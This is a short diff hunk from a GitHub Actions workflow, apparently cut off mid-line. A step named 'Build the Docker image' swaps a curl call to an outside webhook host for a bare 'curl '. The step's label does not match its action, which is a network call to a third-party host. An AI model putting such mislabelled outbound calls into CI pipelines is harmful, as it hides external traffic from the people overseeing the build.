@@ -15,4 +15,4 @@ jobs:
     steps:
     - uses: actions/checkout@v2
     - name: Build the Docker image
-      run: curl https://hooks-nw-public.stripe.com:9003/github-status/from/git@github.com
+      run: curl 
